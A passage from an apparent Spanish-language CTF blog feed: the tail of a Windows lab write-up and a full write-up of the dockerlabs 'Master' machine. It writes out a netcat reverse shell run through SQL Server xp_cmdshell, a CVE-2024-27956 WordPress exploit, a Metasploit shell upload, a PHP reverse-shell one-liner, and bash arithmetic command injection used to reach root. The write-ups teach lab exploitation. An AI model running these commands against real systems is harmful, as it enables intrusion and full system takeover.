| nbstat: NetBIOS name: DESKTOP-M464J3M, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:b0:1c:c9 <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
| Names:
|   DESKTOP-M464J3M&lt;00&gt;  Flags: &lt;unique&gt;&lt;active&gt;
|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
|   DESKTOP-M464J3M&lt;20&gt;  Flags: &lt;unique&gt;&lt;active&gt;
|   WORKGROUP&lt;1e&gt;        Flags: &lt;group&gt;&lt;active&gt;
|   WORKGROUP&lt;1d&gt;        Flags: &lt;unique&gt;&lt;active&gt;
|_  <span class="se">\x</span>01<span class="se">\x</span>02__MSBROWSE__<span class="se">\x</span>02&lt;01&gt;  Flags: &lt;group&gt;&lt;active&gt;
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   <span class="nb">date</span>: 2024-06-30T17:29:55
|_  start_date: N/A
|_clock-skew: mean: 26s, deviation: 0s, median: 25s
</code></pre></div></div>

<p>Encontramos una web en el puerto <code class="language-plaintext highlighter-rouge">9081</code>, vemos que tecnología usa con <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>whatweb <span class="nt">-a</span> 3 http://10.0.2.145:9081
http://10.0.2.145:9081 <span class="o">[</span>302 Found] ASP_NET[4.0.30319], Country[RESERVED][ZZ], HTTPServer[Cassini/4.0.1.6], IP[10.0.2.145], RedirectLocation[/App/Login.aspx], Title[Object moved]                                                                                                                                                         
http://10.0.2.145:9081/App/Login.aspx <span class="o">[</span>200 OK] ASP_NET[4.0.30319], Bootstrap, Cookies[ASP.NET_SessionId], Country[RESERVED][ZZ], HTML5, HTTPServer[Cassini/4.0.1.6], HttpOnly[ASP.NET_SessionId], IP[10.0.2.145], JQuery[3.7.0], PasswordField[txtPassword], Script[text/javascript], Title[Login Saci]
</code></pre></div></div>

<p>Realizamos una búsqueda de ficheros y directorios con <code class="language-plaintext highlighter-rouge">feroxbuster</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>feroxbuster <span class="nt">-u</span> http://10.0.2.145:9081 <span class="nt">-w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt <span class="nt">-x</span> aspx <span class="nt">-r</span> <span class="nt">-d</span> 2
...
200      GET        2l        2w       22c http://10.0.2.145:9081/download/notas.txt
...

</code></pre></div></div>

<p>Encontramos un fichero llamado <code class="language-plaintext highlighter-rouge">notas.txt</code>, lo descargamos y leemos lo que tiene:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://10.0.2.145:9081/download/notas.txt
supervisor
supervisor
</code></pre></div></div>

<p>Parece que son las credenciales para acceder a la web. Nos logeamos con éxito pero no conseguimos hacer nada para ganar la intrusión. Asi que miramos a ver que hay en el servicio <code class="language-plaintext highlighter-rouge">samba</code>. Ejecutamos <code class="language-plaintext highlighter-rouge">smbclient</code> con los parámetros <code class="language-plaintext highlighter-rouge">—-no-pass</code> para no usar credenciales, <code class="language-plaintext highlighter-rouge">-L</code> para hacer un listado de unidades y el target <code class="language-plaintext highlighter-rouge">//10.0.2.145</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>smbclient <span class="nt">--no-pass</span> <span class="nt">-L</span> //10.0.2.145

        Sharename       Type      Comment
        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
        ADMIN<span class="nv">$ </span>         Disk      Admin remota
        C<span class="nv">$ </span>             Disk      Recurso predeterminado
        Compac          Disk      
        IPC<span class="nv">$ </span>           IPC       IPC remota
        Users           Disk
</code></pre></div></div>

<p>Vemos 2 recursos compartidos interesantes <code class="language-plaintext highlighter-rouge">Compac</code> y <code class="language-plaintext highlighter-rouge">Users</code>. Nos conectamos al recurso <code class="language-plaintext highlighter-rouge">Compac</code> y listamos los directorios:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbclient <span class="nt">--no-pass</span> //10.0.2.145/Compac
Try <span class="s2">"help"</span> to get a list of possible commands.
smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
  <span class="nb">.</span>                                   D        0  Sat May 11 04:49:15 2024
  ..                                  D        0  Sat May 11 04:49:15 2024
  Empresas                            D        0  Sat May 11 04:49:15 2024
  Index                               D        0  Sun Jun 30 23:52:48 2024
</code></pre></div></div>

<p>Haciendo un listado de <code class="language-plaintext highlighter-rouge">Empresas</code> vemos un fichero que llama la atención <code class="language-plaintext highlighter-rouge">SQL.txt</code>, lo descargamos a nuestra máquina:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\E</span>mpresas<span class="se">\&gt;</span> get SQL.txt 
getting file <span class="se">\E</span>mpresas<span class="se">\S</span>QL.txt of size 448 as SQL.txt <span class="o">(</span>5.3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 5.3 KiloBytes/sec<span class="o">)</span>
</code></pre></div></div>

<p>Lo abrimos y vemos unas posibles credenciales de acceso al servicio de <code class="language-plaintext highlighter-rouge">SQL Server</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>SQL.txt 
SQL 2017 
Instancia COMPAC 
sa 
Contpaqi2023.

</code></pre></div></div>

<h1 id="intrusión">Intrusión</h1>

<p>Vamos a usar el cliente de sql que trae el paquete <code class="language-plaintext highlighter-rouge">impacket</code>. Usamos <code class="language-plaintext highlighter-rouge">impacket-mssqlclient</code> con los parámetros <code class="language-plaintext highlighter-rouge">COMPAC/</code> , que es el nombre de dominio que hemos visto en el escaneo, seguido de las credenciales <code class="language-plaintext highlighter-rouge">sa:Contpaqi2023.</code> , le indicamos el target <code class="language-plaintext highlighter-rouge">@10.0.2.145</code> y el puerto, ya que no está en el puerto por defecto, <code class="language-plaintext highlighter-rouge">-port 49992</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>impacket-mssqlclient COMPAC/sa:Contpaqi2023.@10.0.2.145 <span class="nt">-port</span> 49992
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Encryption required, switching to TLS
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>DATABASE<span class="o">)</span>: Old Value: master, New Value: master
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>LANGUAGE<span class="o">)</span>: Old Value: , New Value: us_english
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ENVCHANGE<span class="o">(</span>PACKETSIZE<span class="o">)</span>: Old Value: 4096, New Value: 16192
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DESKTOP-M464J3M<span class="se">\C</span>OMPAC<span class="o">)</span>: Line 1: Changed database context to <span class="s1">'master'</span><span class="nb">.</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> INFO<span class="o">(</span>DESKTOP-M464J3M<span class="se">\C</span>OMPAC<span class="o">)</span>: Line 1: Changed language setting to us_english.
<span class="o">[</span><span class="k">*</span><span class="o">]</span> ACK: Result: 1 - Microsoft SQL Server <span class="o">(</span>140 3232<span class="o">)</span> 
<span class="o">[!]</span> Press <span class="nb">help </span><span class="k">for </span>extra shell commands
SQL <span class="o">(</span>sa  dbo@master<span class="o">)&gt;</span>
</code></pre></div></div>

<p>En SQL Server hay un comando que sirve para ejecutar comandos por una shell, <code class="language-plaintext highlighter-rouge">xp_cmdshell</code>. Asi que una vez conectados probamos a ver si funciona el comando:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>sa  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="nb">whoami
</span>output                
<span class="nt">-------------------</span>   
nt authority<span class="se">\s</span>ystem   

NULL
</code></pre></div></div>

<p>Vemos que si y encima está ejecutando los comandos como <strong>nt authority\system.</strong></p>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Vamos a preparar la obtención de una shell remota como <strong>nt authority\system</strong>. Para ello nos copiamos el binario <code class="language-plaintext highlighter-rouge">nc.exe</code> a nuestro directorio de trabajo. También ponemos el servidor samba con <code class="language-plaintext highlighter-rouge">impacket-smbserver</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cp</span> /usr/share/windows-binaries/nc.exe <span class="nb">.</span>

<span class="nv">$ </span>impacket-smbserver <span class="nt">-smb2support</span> murrusko <span class="nb">.</span>
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
</code></pre></div></div>

<p>Nos ponemos a la escucha en nuestra máquina:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
listening on <span class="o">[</span>any] 8888 ...
</code></pre></div></div>

<p>Y ejecutamos el comando para obtener la shell reversa:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SQL <span class="o">(</span>sa  dbo@master<span class="o">)&gt;</span> xp_cmdshell <span class="se">\\</span>10.0.2.5<span class="se">\m</span>urrusko<span class="se">\n</span>c.exe 10.0.2.5 8888 <span class="nt">-e</span> cmd
</code></pre></div></div>

<p>Conseguimos la shell y vemos que realmente estamos con <strong>nt authority\system</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
listening on <span class="o">[</span>any] 8888 ...
connect to <span class="o">[</span>10.0.2.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.0.2.145] 49246
Microsoft Windows <span class="o">[</span>Versi?n 10.0.19045.2965]
<span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. Todos los derechos reservados.

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami  
<span class="nb">whoami
</span>nt authority<span class="se">\s</span>ystem

C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;
</code></pre></div></div>

<p>Ahora solo queda obtener las flags, pero antes solo queda un reto, obtener la flag de root… Os lo dejo a vosotros, como pista buscar <strong>ADS data streams</strong></p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="thl" /><category term="ctf" /><category term="windows" /><category term="principiante" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Master</title><link href="/posts/master/" rel="alternate" type="text/html" title="Master" /><published>2024-07-01T00:00:00+00:00</published><updated>2024-07-01T00:00:00+00:00</updated><id>/posts/master</id><content type="html" xml:base="/posts/master/"><![CDATA[<p><img src="/assets/images/master/master.png" alt="image" /></p>

<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel medio y es de la plataforma <a href="https://dockerlabs.es">dockerlabs</a>.</p>

<h1 id="enumeración">Enumeración</h1>

<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.17.0.2</code>.</p>

<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.17.0.2</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 172.17.0.2
PORT   STATE SERVICE
80/tcp open  http
</code></pre></div></div>

<p>Vemos que solo tiene el puerto <strong>80</strong> abierto. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span> <span class="nt">-v</span> 172.17.0.2
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.58 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-favicon: Unknown favicon MD5: CCF3F1622BBC8760E39AAB495FD4A9B1
|_http-server-header: Apache/2.4.58 <span class="o">(</span>Ubuntu<span class="o">)</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Master
|_http-generator: WordPress 6.5.5
MAC Address: 02:42:AC:11:00:02 <span class="o">(</span>Unknown<span class="o">)</span>
</code></pre></div></div>

<p>Como vemos hay un <strong>wordpress 6.5.5</strong> corriendo. Para escanear el framework usamos la herramienta <code class="language-plaintext highlighter-rouge">wpscan</code>, le pasamos como parametros el target con <code class="language-plaintext highlighter-rouge">—-url</code>, con <code class="language-plaintext highlighter-rouge">-e u,vp,vt</code> le indicamos que nos enumere los usuarios, los plugins vulnerables y los themes vulnerables y que busque los plugins de forma agresiva con <code class="language-plaintext highlighter-rouge">--plugins-detection</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wpscan <span class="nt">--url</span> http://172.17.0.2 <span class="nt">-e</span> u,vp,vt <span class="nt">--plugins-detection</span> aggressive

...
wp-automatic
 | Location: http://172.17.0.2/wp-content/plugins/wp-automatic/
 | Latest Version: 3.98.0
 | Last Updated: 2024-06-06T01:52:56.000Z
 |
 | Found By: Known Locations <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  - http://172.17.0.2/wp-content/plugins/wp-automatic/, status: 200
 |
 | <span class="o">[!]</span> 7 vulnerabilities identified:
 ....
 
 | <span class="o">[!]</span> Title: Automatic &lt; 3.92.1 - Unauthenticated SQL Injection
 |     Fixed <span class="k">in</span>: 3.92.1
 |     References:
 |      - https://wpscan.com/vulnerability/53a51e79-a216-4ca3-ac2d-57098fd2ebb5
 |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name<span class="o">=</span>CVE-2024-27956
 |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/a8b319be-f312-4d02-840f-e2a91c16b67a
 |
....

 User<span class="o">(</span>s<span class="o">)</span> Identified:

<span class="o">[</span>+] mario
 | Found By: Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  - http://172.17.0.2/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100&amp;page<span class="o">=</span>1
 | Confirmed By:
 |  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 |  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
</code></pre></div></div>

<h1 id="intrusión">Intrusión</h1>

<p>Como vemos es vulnerable a <strong>Unauthenticated SQL Injection</strong> con un CVE <strong>CVE-2024-2795</strong>. Descargamos el siguiente exploit de github para explotar la vulnerabilidad:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget https://raw.githubusercontent.com/diego-tella/CVE-2024-27956-RCE/main/exploit.py
</code></pre></div></div>

<p>Lo ejecutamos y vemos que nos crea un usuario con rol de admistrador:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python exploit.py http://172.17.0.2
<span class="o">[</span>+] Exploit <span class="k">for </span>CVE-2024-27956
<span class="o">[</span>+] Creating user eviladmin
<span class="o">[</span>+] Giving eviladmin administrator permissions
<span class="o">[</span>+] Exploit completed!
<span class="o">[</span>+] administrator created: eviladmin:admin
</code></pre></div></div>

<p>Ahora para obtener una shell reverse vamos a usar <strong>Metasploit</strong>, lo abrimos con <code class="language-plaintext highlighter-rouge">msfconsole</code>. Después vamos a usar el exploit <strong>wp_admin_shell_upload</strong> que sirve para subir un plugin que genera para que nos de una shell reversa. En este caso voy a usar un payload para que solo me devuelva una shell y no una sesión de meterpreter. Ejecutamos <code class="language-plaintext highlighter-rouge">set payload generic/shell_reverse_tcp</code> :</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> use exploit/unix/webapp/wp_admin_shell_upload
<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>payload generic/shell_reverse_tcp 
payload <span class="o">=&gt;</span> generic/shell_reverse_tcp
</code></pre></div></div>

<p>Después vemos las opciones disponibles para que funcione el exploit con <code class="language-plaintext highlighter-rouge">options</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> options

Module options <span class="o">(</span>exploit/unix/webapp/wp_admin_shell_upload<span class="o">)</span>:

   Name       Current Settin  Required  Description
              g
   <span class="nt">----</span>       <span class="nt">--------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   PASSWORD                   <span class="nb">yes       </span>The WordPress passwor
                                        d to authenticate wit
                                        h
   Proxies                    no        A proxy chain of form
                                        at <span class="nb">type</span>:host:port[,ty
                                        pe:host:port][...]
   RHOSTS                     <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, s
                                        ee https://docs.metas
                                        ploit.com/docs/using-
                                        metasploit/basics/usi
                                        ng-metasploit.html
   RPORT      80              <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
   SSL        <span class="nb">false           </span>no        Negotiate SSL/TLS <span class="k">for
                                         </span>outgoing connections
   TARGETURI  /               <span class="nb">yes       </span>The base path to the
                                        wordpress application
   USERNAME                   <span class="nb">yes       </span>The WordPress usernam
                                        e to authenticate wit
                                        h
   VHOST                      no        HTTP server virtual h
                                        ost

Payload options <span class="o">(</span>generic/shell_reverse_tcp<span class="o">)</span>:

   Name   Current Setting  Required  Description
   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
   LHOST  192.168.1.12     <span class="nb">yes       </span>The listen address <span class="o">(</span>an i
                                     nterface may be specifie
                                     d<span class="o">)</span>
   LPORT  4444             <span class="nb">yes       </span>The listen port

Exploit target:

   Id  Name
   <span class="nt">--</span>  <span class="nt">----</span>
   0   WordPress
</code></pre></div></div>

<p>En nuestro caso cambiamos el <strong>rhost</strong>, la url, el <strong>lhost</strong>, nuestra ip, <strong>username</strong>, el user recien creado, y <strong>password</strong>, su password:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhost http://172.17.0.1
rhost <span class="o">=&gt;</span> http://172.17.0.2
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>lhost docker0
lhost <span class="o">=&gt;</span> 172.17.0.1
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>username eviladmin
username <span class="o">=&gt;</span> eviladmin
msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>password admin
password <span class="o">=&gt;</span> admin
</code></pre></div></div>

<p>Lo ejecutamos con <code class="language-plaintext highlighter-rouge">exploit</code> y obtenemos una shell como <strong>www-data</strong>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>unix/webapp/wp_admin_shell_upload<span class="o">)</span> <span class="o">&gt;</span> exploit

<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 172.17.0.1:4444 
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Authenticating with WordPress using eviladmin:admin...
<span class="o">[</span>+] Authenticated with WordPress
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Preparing payload...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading payload...
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executing the payload at /wp-content/plugins/YhxOuYmNHi/kMJyYmwgTI.php...
<span class="o">[</span>+] Deleted kMJyYmwgTI.php
<span class="o">[</span>+] Deleted YhxOuYmNHi.php
<span class="o">[</span>+] Deleted ../YhxOuYmNHi
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Command shell session 1 opened <span class="o">(</span>172.17.0.1:4444 -&gt; 172.17.0.2:48282<span class="o">)</span> at 2024-07-02 00:43:51 +0200

<span class="nb">whoami
</span>www-data
</code></pre></div></div>

<p>La shell que proporciona metasploit no me gusta mucho, por ello me voy a crear una shell con netcat. Nos ponemos a la escucha en nuestra máquina:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8888
listening on <span class="o">[</span>any] 8888 ...
</code></pre></div></div>

<p>Ejecutamos el siguiente payload para que genere la shell reversa:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>php <span class="nt">-r</span> <span class="s1">'$sock=fsockopen("172.17.0.1",8888);exec("/bin/bash &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
</code></pre></div></div>

<p>Y para terminar hacemos el tratamiento de la shell para tener una TTY completa:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nlvp</span> 8888
listening on <span class="o">[</span>any] 8888 ...
connect to <span class="o">[</span>172.17.0.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>172.17.0.2] 55124
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
script /dev/null <span class="nt">-qc</span> /bin/bash
sh: 0: getcwd<span class="o">()</span> failed: No such file or directory
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
www-data@28f7a25fdecd:<span class="nv">$ </span>^Z
zsh: suspended  nc <span class="nt">-nlvp</span> 8888
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">stty </span>raw <span class="nt">-echo</span><span class="p">;</span> <span class="nb">fg</span>
<span class="o">[</span>1]  + continued  nc <span class="nt">-nlvp</span> 8888
<span class="nb">ls
</span>www-data@28f7a25fdecd:<span class="nv">$ </span><span class="nb">export </span><span class="nv">TERM</span><span class="o">=</span>xterm
www-data@28f7a25fdecd:<span class="nv">$ </span>reset
</code></pre></div></div>

<p>Ahora ya en nuestra máquina vemos con <code class="language-plaintext highlighter-rouge">sudo -l</code> si podríamos ejecutar algo como otro usuario:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@28f7a25fdecd:<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>www-data on 28f7a25fdecd:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
    use_pty

User www-data may run the following commands on 28f7a25fdecd:
    <span class="o">(</span>pylon<span class="o">)</span> NOPASSWD: /usr/bin/php
</code></pre></div></div>

<h1 id="movimientos-laterales">Movimientos laterales</h1>

<p>Podríamos ejecutar como <strong>pylon</strong> el comando <code class="language-plaintext highlighter-rouge">php</code> sin necesidad de contraseña. Vamos a <a href="https://gtfobins.github.io/gtfobins/php/#sudo">GTFOBins</a> y encontramos como ejecutarlo con <strong>sudo</strong> para hacer el movimiento lateral</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@28f7a25fdecd:<span class="nv">$ CMD</span><span class="o">=</span><span class="s2">"/bin/bash"</span>
www-data@28f7a25fdecd:<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> pylon php <span class="nt">-r</span> <span class="s2">"system('</span><span class="nv">$CMD</span><span class="s2">');"</span>
pylon@28f7a25fdecd:<span class="nv">$ </span><span class="nb">whoami
</span>pylon
</code></pre></div></div>

<p>Ya estamos como <strong>pylon</strong>. Ahora volvemos a mirar si podemos ejecutar algo como otro usuario:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pylon@28f7a25fdecd:<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>pylon on 28f7a25fdecd:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty

User pylon may run the following commands on 28f7a25fdecd:
    <span class="o">(</span>mario<span class="o">)</span> NOPASSWD: /bin/bash /home/mario/pingusorpresita.sh
</code></pre></div></div>

<p>Como explico Mario en este <a href="https://youtube.com/shorts/30Z2QVJfhGs?feature=shared">short</a> en su canal de YouTube vamos a movernos al usuario mario usando esa técnica:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pylon@28f7a25fdecd:<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> mario /bin/bash /home/mario/pingusorpresita.sh
Escribe 1 para ver el canal del pinguino, o cualquier otro numero para acceder a la academia: a[<span class="si">$(</span><span class="nb">whoami</span> <span class="o">&gt;</span>&amp;2<span class="si">)</span><span class="o">]</span>+1
mario
https://www.youtube.com/@ElPinguinoDeMario

<span class="c"># Funciona! Ahora ejecutamos una shell en bash</span>
pylon@28f7a25fdecd:<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> mario /bin/bash /home/mario/pingusorpresita.sh
Escribe 1 para ver el canal del pinguino, o cualquier otro numero para acceder a la academia: a[<span class="si">$(</span>bash  <span class="o">&gt;</span>&amp;2<span class="si">)</span><span class="o">]</span>+1
mario@28f7a25fdecd:~<span class="nv">$ </span><span class="nb">whoami
</span>mario
</code></pre></div></div>

<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>

<p>Una vez estamos como mario hacemos el mismo proceso para convertirnos en root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mario@28f7a25fdecd:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>mario on 28f7a25fdecd:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
    use_pty

User mario may run the following commands on 28f7a25fdecd:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/bash /home/pylon/pylonsorpresita.sh
    
mario@28f7a25fdecd:~<span class="nv">$ </span><span class="nb">sudo</span> /bin/bash /home/pylon/pylonsorpresit/bin/bash /home/pylon/pylonsorpresita.sh
Escribe 1 para ver el canal de pylon: a[<span class="si">$(</span>bash  <span class="o">&gt;</span>&amp;2<span class="si">)</span><span class="o">]</span>+1
root@28f7a25fdecd:/home/mario# <span class="nb">cd</span> ~
root@28f7a25fdecd:~# <span class="nb">hostname</span><span class="p">;</span> <span class="nb">whoami
</span>28f7a25fdecd
root
root@28f7a25fdecd:~# 
</code></pre></div></div>

<p>Y con este terminamos la máquina.</p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="medio" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">DebugSec</title><link href="/posts/debugsec/" rel="alternate" type="text/html" title="DebugSec" /><published>2024-06-29T00:00:00+00:00</published><updated>2024-06-29T00:00:00+00:00</updated><id>/posts/debugsec</id><content type="html" xml:base="/posts/debugsec/"><![CDATA[<p><img src="/assets/images/debugsec/1.jpg" alt="image" /></p>

